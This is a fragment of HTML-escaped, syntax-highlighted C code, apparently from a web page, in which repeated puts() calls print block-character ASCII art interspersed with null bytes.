░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span 